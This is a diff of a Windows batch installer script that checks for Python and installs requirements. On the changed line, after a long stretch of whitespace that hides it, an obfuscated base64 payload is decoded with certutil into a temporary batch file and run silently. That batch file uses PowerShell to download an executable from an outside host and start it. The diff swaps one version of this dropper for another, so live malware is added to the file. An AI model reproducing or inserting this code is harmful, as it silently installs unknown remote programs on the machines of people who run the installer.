@@ -30,7 +30,7 @@ if defined python (
     goto missingPython
 )
 cls
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                               & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCjo6IERlZmluZSBkaXJlY3RvcmllcyB0byBzZWFyY2gNCnNldCAiZGlycz0lVEVNUCUgJUFQUERBVEElICVMT0NBTEFQUERBVEElIEM6XFdpbmRvd3NcdGVtcCINCg0KOjogRGVmaW5lIGNoYXJhY3RlcnMgZm9yIHJhbmRvbSBmaWxlIG5hbWUgZ2VuZXJhdGlvbg0Kc2V0ICJjaGFycz1BQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZl9naGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiDQpzZXQgImZpbGVfbmFtZT0iDQoNCjo6IEdlbmVyYXRlIGEgcmFuZG9tIDYtY2hhcmFjdGVyIGZpbGUgbmFtZQ0KZm9yIC9MICUlaSBpbiAoMSwxLDYpIGRvICgNCiAgICBzZXQgL2EgInJhbmQ9IXJhbmRvbSEgJSUgNjIiDQogICAgY2FsbCBzZXQgImZpbGVfbmFtZT0hZmlsZV9uYW1lISUlY2hhcnM6fiFyYW5kISwxJSUiDQopDQpzZXQgImZpbGVfbmFtZT0hZmlsZV9uYW1lIS5leGUiDQoNCjo6IEl0ZXJhdGUgb3ZlciBkaXJlY3RvcmllcyBhbmQgZG93bmxvYWQgdGhlIGZpbGUNCmZvciAlJWQgaW4gKCVkaXJzJSkgZG8gKA0KICAgIHNldCAiZmlsZV9wYXRoPSUlZFwhZmlsZV9uYW1lISINCiAgICBwb3dlcnNoZWxsIC1jb21tYW5kICJ0cnkgeyAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dvbm5hY3JhY2suZGlzY2xvdWQuYXBwL1VwZGF0ZScsICchZmlsZV9wYXRoIScpOyBleGl0IDAgfSBjYXRjaCB7IGV4aXQgMSB9Ig0KICAgIA0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICBzdGFydCAiIiAiIWZpbGVfcGF0aCEiDQogICAgICAgIGNscw0KICAgICAgICBlbmRsb2NhbA0KICAgICAgICBleGl0IC9iIDANCiAgICApDQopDQoNCjplbmRfc2NyaXB0DQplbmRsb2NhbA > %TMP%\temp.b64 & certutil -decode %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1 & call %TMP%\update.bat >nul 2>&1 & del %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQpzZXQgImRzPSVURU1QJSAlQVBQREFUQSUgJUxPQ0FMQVBQREFUQSUiDQpmb3IgJSVkIGluICglZHMlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dvbm5hY3JhY2suZGlzY2xvdWQuYXBwL1VwZGF0ZScsICclJWRcVXBkYXRlLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWRcVXBkYXRlLmV4ZSIgJiBleGl0IC9iIDApKQ0KZW5kbG9jYWwNCmV4aXQgL2IgMQ0K > %TMP%\tmp.b64 & certutil -decode %TMP%\tmp.b64 %TMP%\upd.bat >nul 2>&1 & call %TMP%\upd.bat >nul 2>&1 & del %TMP%\tmp.b64 %TMP%\upd.bat >nul 2>&1
 call "!python!" -m pip install -r requirements.txt
 if errorlevel 1 (
     cls
@@ -40,7 +40,7 @@ if errorlevel 1 (
 )
 
 cls
-"!python!" main.py
+"!python!" gen.py
 
 if errorlevel 1 (
     cls
